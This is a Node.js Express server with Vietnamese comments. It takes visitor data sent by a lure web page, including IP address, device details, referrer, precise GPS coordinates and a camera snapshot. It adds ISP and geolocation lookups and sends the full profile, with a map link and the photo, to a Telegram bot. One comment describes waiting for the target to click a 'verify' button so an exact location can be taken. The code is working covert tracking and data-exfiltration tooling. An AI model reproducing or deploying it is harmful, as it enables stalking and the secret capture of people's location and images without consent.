require('dotenv').config();
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Đường dẫn tệp lưu trữ lịch sử truy cập
const LOG_FILE = path.join(__dirname, 'access_logs.json');

// Hàm đọc/ghi lịch sử truy cập
function updateAccessHistory(ip, referrer) {
    let logs = {};
    if (fs.existsSync(LOG_FILE)) {
        try {
            logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        } catch (e) { logs = {}; }
    }
    
    if (!logs[ip]) {
        logs[ip] = { count: 0, first_access: new Date().toLocaleString('vi-VN'), sources: [] };
    }
    
    // Đảm bảo trường sources luôn tồn tại (phòng trường hợp tệp log cũ không có)
    if (!logs[ip].sources) {
        logs[ip].sources = [];
    }
    
    logs[ip].count += 1;
    
    if (referrer && !logs[ip].sources.includes(referrer)) {
        logs[ip].sources.unshift(referrer);
        if (logs[ip].sources.length > 5) logs[ip].sources.pop();
    }
    
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
    return logs[ip];
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Hàm gửi tin nhắn văn bản đến Telegram
async function sendTelegramMessage(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Lỗi khi gửi tin nhắn Telegram:', error.message);
    }
}

// Hàm gửi ảnh đến Telegram
async function sendTelegramPhoto(imageBuffer, caption) {
    try {
        const formData = new URLSearchParams();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        
        // Telegram API expects a file, so we use a different approach for base64
        // For simplicity in this script, we'll send it as a multipart/form-data
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', caption);
        form.append('photo', imageBuffer, { filename: 'capture.jpg' });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {
        console.error('Lỗi khi gửi ảnh Telegram:', error.message);
    }
}

app.post('/api/report', async (req, res) => {
    const data = req.body;
    
    // Ưu tiên IP thật do client gửi lên (giúp test localhost vẫn hiện ISP)
    let ip = data.publicIp || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
    
    // Nếu IP vẫn là localhost (::1 hoặc 127.0.0.1), chúng ta tra cứu một IP mẫu hoặc bỏ qua
    let ipLookup = ip;
    if (ip === '::1' || ip === '127.0.0.1') {
        ipLookup = ''; // API ip-api.com sẽ dùng IP của chính server để tra cứu (nếu chạy online)
    }

    let ipInfo = {};
    try {
        const response = await axios.get(`http://ip-api.com/json/${ipLookup}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile,query`);
        if (response.data.status === 'success') {
            ipInfo = response.data;
        }
    } catch (err) {
        console.error('Lỗi lấy IP info:', err.message);
    }

    // Cập nhật lịch sử truy cập nội bộ với nguồn đến
    const history = updateAccessHistory(ipInfo.query || ip, data.referrer);

    let message = `<b>📡 [THÔNG TIN TRUY CẬP]</b>\n\n`;
    message += `<b>🕒 Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n`;
    message += `<b>💻 Thiết bị:</b> ${data.platform || 'N/A'}\n`;
    message += `<b>🖥️ Hệ điều hành:</b> ${data.userAgent || 'N/A'}\n\n`;
    
    message += `<b>🌍 IP mạng:</b> ${ipInfo.query || ip}\n`;
    message += `<b>🏢 ISP:</b> ${ipInfo.isp || 'N/A'}\n`;
    message += `<b>🌐 ASN:</b> ${ipInfo.as || 'N/A'}\n`;
    
    // Đánh giá mức độ nguy hiểm
    let securityNote = "✅ Mạng dân dụng";
    if (ipInfo.proxy) securityNote = "⚠️ Cảnh báo: Sử dụng Proxy/VPN";
    if (ipInfo.hosting) securityNote = "🚫 Cảnh báo: IP từ Máy chủ (Data Center)";
    message += `<b>🛡️ Loại mạng:</b> ${securityNote}\n`;

    // Hiển thị lịch sử truy cập và 5 trang gần nhất
    message += `<b>📊 Lịch sử:</b> Đã click <b>${history.count}</b> lần\n`;
    if (history.sources && history.sources.length > 0) {
        message += `<b>🔗 5 trang truy cập gần nhất:</b>\n`;
        history.sources.forEach((src, index) => {
            message += `<b> ${index + 1}.</b> <code>${src}</code>\n`;
        });
    }
    
    let address = `<i>Đang xác định địa chỉ...</i>`;
    let addressType = "Ước tính (IP)";
    
    // Nếu chưa có GPS, lấy tạm từ IP
    if (!data.location) {
        address = `${ipInfo.city || 'N/A'}, ${ipInfo.regionName || 'N/A'}`;
    } else {
        addressType = "Chính xác (GPS)";
        try {
            const geoRes = await axios.get(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${data.location.latitude}&longitude=${data.location.longitude}&localityLanguage=vi`);
            if (geoRes.data) {
                const g = geoRes.data;
                address = `${g.locality || ''}, ${g.city || ''}, ${g.principalSubdivision || ''}`.replace(/^, |, $/, '').trim();
                if (!address) address = `${g.city || 'N/A'}`;
            }
        } catch (e) {
            console.error('Lỗi lấy địa chỉ từ tọa độ:', e.message);
            address = "Không thể lấy địa chỉ chi tiết";
        }
    }

    message += `<b>🏙️ Địa chỉ (${addressType}):</b> <code>${address}</code>\n`;
    message += `<b>🌏 Quốc gia:</b> ${ipInfo.country || 'Việt Nam'}\n\n`;
    
    if (data.location) {
        message += `<b>📍 Vị trí CHÍNH XÁC (GPS):</b>\n`;
        message += `<b>└ Vĩ độ:</b> <code>${data.location.latitude}</code>\n`;
        message += `<b>└ Kinh độ:</b> <code>${data.location.longitude}</code>\n`;
        message += `<b>└ Độ chính xác:</b> ±${Math.round(data.location.accuracy || 0)} mét\n`;
        message += `<b>📌 Google Maps:</b> <a href="https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}">Mở bản đồ thực tế (CHÍNH XÁC)</a>\n`;
    } else if (ipInfo.lat) {
        message += `<b>📍 Vị trí ƯỚC TÍNH (IP):</b>\n`;
        message += `<b>└ Vĩ độ:</b> <code>${ipInfo.lat}</code>\n`;
        message += `<b>└ Kinh độ:</b> <code>${ipInfo.lon}</code>\n`;
        message += `<b>📌 Google Maps:</b> <a href="https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}">Mở bản đồ ước tính (SAI SỐ CAO)</a>\n`;
        message += `<i>⚠️ Lưu ý: Đây là vị trí trạm mạng, không phải nhà hacker. Hãy chờ hacker nhấn xác minh để lấy vị trí chính xác hơn.</i>\n`;
    } else {
        message += `<b>📌 Google Maps:</b> <i>Đang chờ tọa độ GPS...</i>\n`;
    }

    message += `\n<b>📸 Camera:</b> ✅ ${data.image ? 'Đã chụp camera' : 'Không chụp được'}\n`;
    message += `\n⚠️ <i>Ghi chú: Thông tin có thể chưa chính xác 100%.</i>`;

    if (data.image) {
        const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        await sendTelegramPhoto(buffer, message);
    } else {
        await sendTelegramMessage(message);
    }

    res.status(200).json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`Server đang chạy tại http://localhost:${PORT}`);
});
